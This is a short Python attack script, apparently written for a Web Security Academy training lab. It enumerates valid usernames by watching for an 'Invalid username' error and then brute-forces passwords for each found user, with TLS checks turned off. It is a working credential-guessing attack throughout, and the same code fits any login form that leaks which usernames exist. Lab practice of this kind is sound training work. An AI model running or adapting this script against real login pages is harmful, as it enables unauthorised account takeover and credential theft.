#!/usr/bin/python3
import requests
import warnings

# Ignore any and all warnings and don't show it on cmd output
warnings.simplefilter("ignore")

# request body in dictionary
payload = {"username": "admin", "password": "admin"}
url="https://0a1500fa046ab4f880c3440600630046.web-security-academy.net/login"

def enum_users():
    # List of usernames to enumerate.
    users = list()

    # Read users.lst and store it in a list to be used further
    with open("./users.lst", "rt") as userslst:
        for user in userslst.readlines():
            users.append(user.strip())

    validUsers = list()
    for user in users:
        # print("[*] Trying username", user, sep=": ")
        payload["username"] = user # change the placeholder of username field to the user from users list

        # Send the HTTP POST request to the url
        response = requests.post(url, data=payload, verify=False)

        # check if the "Invalid username" is in the response, if not then valid username
        if "Invalid username" not in response.text:
            # print("\t[+] Found valid username", user, sep=": ")
            validUsers.append(user)

    print("\n\n[*] Valid Users", validUsers, sep=": ")

    return validUsers

def enum_password(validUsers):
    # List of usernames to enumerate.
    passwords = list()

    # Read users.lst and store it in a list to be used further
    with open("./passwords.lst", "rt") as passlst:
        for password in passlst.readlines():
            passwords.append(password.strip())
    
    for user in validUsers:
        payload["username"] = user # change the placeholder of username field to the user from users list

        for password in passwords:
            payload["password"] = password # change the placeholder of password field to the password from passwords list
        
            # Send the HTTP POST request to the url
            response = requests.post(url, data=payload, verify=False)

            # check if the "Invalid password" is in the response, if not then valid password
            if "Incorrect password" not in response.text:
                print(f"\t[+] Found valid username:password pair {user}:{password}")
                break

enum_password(enum_users())